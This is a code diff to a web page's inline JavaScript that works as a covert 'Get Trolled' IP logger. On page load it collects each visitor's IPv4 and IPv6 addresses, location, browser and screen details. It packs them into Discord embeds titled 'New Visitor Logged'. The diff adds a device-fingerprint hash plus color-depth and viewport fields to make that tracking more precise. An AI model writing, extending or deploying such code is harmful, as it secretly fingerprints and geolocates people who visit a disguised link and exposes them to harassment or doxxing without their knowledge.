@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -86,6 +86,32 @@
     return result;
   }
 
+  // Hash + fingerprint
+  function hashString(str) {
+    let hash = 0;
+    for (let i = 0; i < str.length; i++) {
+      const chr = str.charCodeAt(i);
+      hash = (hash << 5) - hash + chr;
+      hash |= 0;
+    }
+    return Math.abs(hash).toString(16);
+  }
+
+  function getDeviceFingerprint() {
+    const fingerprintData = [
+      navigator.userAgent,
+      window.screen.width,
+      window.screen.height,
+      window.devicePixelRatio,
+      window.screen.colorDepth,
+      window.innerWidth,
+      window.innerHeight,
+      navigator.language,
+      navigator.platform
+    ].join('|');
+    return hashString(fingerprintData);
+  }
+
   async function fetchIPInfo() {
     const res = await fetch('https://ipwhois.app/json/');
     if (!res.ok) throw new Error('Failed to fetch IP info');
@@ -97,7 +123,7 @@
       const res = await fetch('https://api64.ipify.org?format=json');
       if (!res.ok) return "N/A";
       const json = await res.json();
-      if (json.ip && json.ip.includes(':')) { // basic IPv6 check
+      if (json.ip && json.ip.includes(':')) {
         return json.ip;
       }
       return "N/A";
@@ -127,8 +153,8 @@
       const uaInfo = parseUserAgent(navigator.userAgent);
       const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone });
 
-      // Prepare all fields
       const allFields = [
+        { name: "Device Fingerprint", value: `\`${getDeviceFingerprint()}\``, inline: false },
         { name: "IPv4 Address", value: `\`${safeValue(data.ip)}\``, inline: true },
         { name: "IPv6 Address", value: ipv6, inline: true },
         { name: "Country", value: `${safeValue(data.country)} (${safeValue(data.country_code)})`, inline: true },
@@ -144,19 +170,19 @@
         { name: "Bot", value: safeValue(safeGet(data, ['security', 'is_bot']) ? "Yes" : "No"), inline: true },
         { name: "Operating System", value: safeValue(uaInfo.os), inline: true },
         { name: "Browser", value: safeValue(uaInfo.browser), inline: true },
-        { name: "User Agent", value: `\`\`\`${safeValue(navigator.userAgent, 1000)}\`\`\``, inline: false },
-        { name: "Screen Resolution", value: `\`${safeValue(window.screen.width)}×${safeValue(window.screen.height)} (${safeValue(window.devicePixelRatio)} DPR)\``, inline: true },
+        { name: "Full User Agent", value: `\`\`\`${safeValue(navigator.userAgent, 1000)}\`\`\``, inline: false },
+        { name: "Screen Resolution", value: `\`${safeValue(window.screen.width)}×${safeValue(window.screen.height)} @${safeValue(window.devicePixelRatio)} DPR\``, inline: true },
+        { name: "Color Depth", value: `${safeValue(window.screen.colorDepth)}-bit`, inline: true },
+        { name: "Viewport Size", value: `${safeValue(window.innerWidth)}×${safeValue(window.innerHeight)}`, inline: true }
       ];
 
-      // Split fields into chunks of 25 (Discord max per embed)
       const chunks = chunkArray(allFields, 25);
 
-      // Create embeds with chunked fields
       const embeds = chunks.map((fieldsChunk, i) => ({
         title: i === 0 ? "🕵️ New Visitor Logged" : undefined,
         color: 0x00ffff,
         timestamp: new Date().toISOString(),
-        footer: i === chunks.length -1 ? {
+        footer: i === chunks.length - 1 ? {
           text: "Get Trolled IP Logger",
           icon_url: "https://i.imgur.com/qZ7j0fV.png"
         } : undefined,
